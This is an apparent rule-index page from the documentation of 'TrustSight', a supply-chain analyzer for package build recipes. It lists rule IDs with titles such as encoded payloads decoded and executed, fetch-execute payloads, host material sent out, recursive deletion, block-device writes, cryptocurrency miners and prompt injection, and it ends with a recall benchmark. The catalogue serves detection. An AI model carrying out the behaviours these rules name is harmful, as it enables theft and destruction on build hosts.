See [H046: Orphan/Adoption Dependency](corpus-behavioral.md#h046).


### H052 {#h052}

See [H052: Shared Source Repository](count-based.md#h052).


### H053 {#h053}

See [H053: Name/Host Consensus Divergence](naming-and-dependency.md#h053).


### H055 {#h055}

See [H055: Attribute Burst](count-based.md#h055).


### H057 {#h057}

See [H057: Transitive Exposure](corpus-behavioral.md#h057).


### H058 {#h058}

See [H058: Maintainer Baseline Deviation](maintainer-and-metadata.md#h058).


### H059 {#h059}

See [H059: Name/Repo Divergence](naming-and-dependency.md#h059).


### H060 {#h060}

See [H060: Transitive Orphan Exposure](corpus-behavioral.md#h060).


### H061 {#h061}

See [H061: Dependency Centrality](corpus-behavioral.md#h061).


### H073 {#h073}

See [H073: Introduction Rate Deviation](corpus-behavioral.md#h073).


### H074 {#h074}

See [H074: Adopt-then-Modify](maintainer-and-metadata.md#h074).

## Additional Per-Package Rules {#additional-per-package-rules}

H086-H088 are per-package findings, not Class D corpus findings. S001-S008
and X001-X023 are the sabotage and crossfire families; their category pages
are authoritative for their conditions and severities.

### H086 {#h086}

See [H086: Adopted From Orphan](maintainer-and-metadata.md#h086).

### H087 {#h087}

See [H087: Recipe Changed Without Upstream](integrity.md#h087).

### W002 {#w002}

See [W002: Build Resolves Dependencies From A Registry](unverifiable.md#w002).

### W003 {#w003}

See [W003: Applies A Patch This Analysis Did Not Read](unverifiable.md#w003).

### W006 {#w006}

See [W006: Generated File Names A Build-Only Path](unverifiable.md#w006).

### W005 {#w005}

See [W005: Build Runs A Target Whose Recipe Was Not Read](unverifiable.md#w005).

### W004 {#w004}

See [W004: Build Engine Runs A Manifest This Analysis Did Not Read](unverifiable.md#w004).

### X022 {#x022}

See [X022: Generated Config Handed To The Tool That Reads It](crossfire.md#x022).

### X023 {#x023}

See [X023: Command Output Executed As A Script](crossfire.md#x023).

### X021 {#x021}

See [X021: Executor Runs A File Chosen At Runtime](crossfire.md#x021).

### X020 {#x020}

See [X020: Recipe Writes The Build Steps The Engine Runs](crossfire.md#x020).

### W001 {#w001}

See [W001: Executes Code This Analysis Did Not Read](unverifiable.md#w001).

### H095 {#h095}

See [H095: Boot Or Image Artifact Built From The Source Tree](install-and-persist.md#h095).

### H094 {#h094}

See [H094: Unread Script Executed During Packaging](fetch-and-execution.md#h094).

### H093 {#h093}

See [H093: Committed Config Points At A Build-Only Path](install-and-persist.md#h093).

### H092 {#h092}

See [H092: Metadata Names A Source The Recipe Does Not](integrity.md#h092).

### H091 {#h091}

See [H091: Checksum Array Shorter Than Source Array](integrity.md#h091).

### H090 {#h090}

See [H090: Committed Companion Carries A Fetch-Execute Payload](fetch-and-execution.md#h090).

### H089 {#h089}

See [H089: Packaged File Names A Build-Only Path](install-and-persist.md#h089).

### R144 {#r144}

See [R144: Packaged File Points At A World-Writable Path](install-and-persist.md#r144).

### H088 {#h088}

See [H088: Adopted, Recipe Rewritten, Unpinned Fetch](maintainer-and-metadata.md#h088).

### X001 {#x001}

See [X001: Encoded Payload Decoded And Executed](crossfire.md#x001).

### X002 {#x002}

See [X002: Non-Literal Executable Name](crossfire.md#x002).

### X003 {#x003}

See [X003: Obfuscated Command Argument](crossfire.md#x003).

### X004 {#x004}

See [X004: Build Output Suppressed](crossfire.md#x004).

### X005 {#x005}

See [X005: Home Reached By An Alternative Spelling](crossfire.md#x005).

### X006 {#x006}

See [X006: Source Points Somewhere Unexpected](crossfire.md#x006).

### X007 {#x007}

See [X007: Multiple Evasion Techniques](crossfire.md#x007).

### X008 {#x008}

See [X008: Whitespace A Shell Does Not Split On](crossfire.md#x008).

### X009 {#x009}

See [X009: Fetch Through An Uncatalogued Client](crossfire.md#x009).

### X010 {#x010}

See [X010: Interpreter One-Liner Reaches The Network](crossfire.md#x010).

### X011 {#x011}

See [X011: Package Manager Runs Fetched Code At Build Time](crossfire.md#x011).

### X012 {#x012}

See [X012: Build Toolchain Redirected Into The Source Tree](crossfire.md#x012).

### X013 {#x013}

See [X013: Fetch Redirected Or Trust Root Replaced](crossfire.md#x013).

### X014 {#x014}

See [X014: Environment Variable Names Code To Run](crossfire.md#x014).

### X015 {#x015}

See [X015: Work Scheduled To Run After The Build](crossfire.md#x015).

### X016 {#x016}

See [X016: Fetch Piped Into An Unrecognised Consumer](crossfire.md#x016).

### X017 {#x017}

See [X017: Tool Flag Or Builtin Carries A Command](crossfire.md#x017).

### X018 {#x018}

See [X018: Interpreter One-Liner Assembles A Name](crossfire.md#x018).

### X019 {#x019}

See [X019: Host Material Sent Or Packaged](crossfire.md#x019).

### S001 {#s001}

See [S001: Recursive Self-Spawn](sabotage.md#s001).

### S002 {#s002}

See [S002: Recursive Deletion Outside The Build Tree](sabotage.md#s002).

### S003 {#s003}

See [S003: Raw Block Device Write](sabotage.md#s003).

### S004 {#s004}

See [S004: Secure Deletion Of User Data](sabotage.md#s004).

### S005 {#s005}

See [S005: Permission Change On A System Path](sabotage.md#s005).

### S006 {#s006}

See [S006: System Service Disruption](sabotage.md#s006).

### S007 {#s007}

See [S007: Cryptocurrency Miner](sabotage.md#s007).

### S008 {#s008}

See [S008: Shell History Or Log Destruction](sabotage.md#s008).


---

## Class E: indicators of compromise (H056) {#class-e-rules}

### H056 {#h056}

See [H056: Known Indicator of Compromise](corpus-behavioral.md#h056).


---

## Not currently a rule {#not-rules}

- **H028 (release cadence)** is metadata on the analysis record, not a scored
  finding. See [H028](corpus-behavioral.md#h028).
- **R103 and R109** describe the ruleset's ceiling rather than a detection.
  See [the novelty ceiling](../../explanation/what-trustsight-cannot-see.md).

The R-series identifier space is not contiguous. Reserved ids appear nowhere
in the shipped config or the code-emitted rule set:

- `R015`, `R026`-`R038`: held apart so the core and expanded ranges stay
  readable, and reassigning them could clash with user `rules.toml` overrides.
- `R078`, `R091`, `R099`, `R103`-`R104`, `R109`, `R113`: unassigned in the
  current shipped configuration. `R103`/`R109` are claimed above as the
  novelty ceiling; the rest are simply unused and may be returned to service
  when a detection needs them.
- The ninety-five ids retired by the R/H split are **retired, not
  recycled**. A stored report, a published baseline and a user's
  `[rules.R###]` override can all still name an old id; handing that number
  to an unrelated new rule would make those references quietly wrong rather
  than loudly absent. The linter refuses a `rules.toml` entry that claims
  one, and the reservation is derived from
  `trustsight.rule_id_history.RENAMED_RULE_IDS` rather than restated here,
  so this page cannot drift from what is enforced. The full mapping is in
  [the changelog](../../changelog.md#rule-id-mapping).

---

## Benchmark performance

Measured against the TrustSight test corpus.

!!! warning "Two rows measure a narrower configuration"

    The recall rows above were measured with `observation_count` unpopulated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../../explanation/cold-start-and-maturity.md)), and against a smaller ruleset than the one documented here. Read them as a floor, not as current recall. The three distribution rows below are re-measured by the calibration gates against the current 3,739-diff corpus on every push.

| Rule | Recall | Notes |
|------|--------|-------|
| CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
| R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
| R013 (unicode bidi) | 88 % | Misses some bidi variants. |
| Benign zero-rate | 68.4 % | Percentage of benign diffs scoring 0. |
| Benign p95 | 35 | 95th percentile score on benign corpus. |
| CRITICAL p5 | 60 | 5th percentile score on CRITICAL-class corpus. |
